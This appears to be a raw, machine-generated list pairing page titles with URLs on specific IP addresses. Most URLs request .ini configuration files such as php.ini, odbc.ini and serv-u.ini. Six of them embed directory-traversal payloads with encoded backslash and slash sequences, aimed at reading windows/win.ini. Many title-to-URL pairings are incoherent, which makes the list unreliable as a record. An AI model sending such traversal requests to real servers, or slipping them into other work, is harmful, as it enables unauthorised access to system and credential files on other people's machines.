www.arcims.tmd.go.th/download/HP%20LaserJet%204100...,http://www.arcims.tmd.go.th/download/HP%2520LaserJet%25204100/Korean/FontInst/Win3x/fonts.ini
mclaveau.com/ress/Paradox/p9/Corel/Programs/pft.ini,http://mclaveau.com/ress/Paradox/p9/Corel/Programs/pft.ini
microsoft,http://210.242.146.157/login/lib/typo3/2082/php.ini
TUTOS Login,http://210.242.146.177/login/view/gs/cgi-bin/preferences.ini
index.of *,http://103.86.103.40/cool-logs/php.ini
Member - Login Form,http://210.242.148.152/login/cgi-bin/vsadmin/preferences.ini
PHProjekt - login,http://210.242.148.136/login/CGI/editor/odbc.ini
b2evo,http://61.62.173.177/login/bitly.com/view/serv-u.ini
EverFocus.EDSR.applet,http://210.63.253.152/login1/enc//..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini
CUPS) - Novell Web Services,http://222.156.247.176/comments/zentrack/blank.php/..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cwindows/win.ini
admin,http://210.242.147.162/login/.br/axis-cgi/flashFXP.ini
Cisco - System Statistics,http://210.242.147.139/comments/coppercop/..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252fwindows/win.ini
EXTRANET login,http://210.203.16.152/login/servlet/view/..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cwindows/win.ini
index of,http://210.202.233.129/login1/vsadmin/default.asp/..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cwindows/win.ini
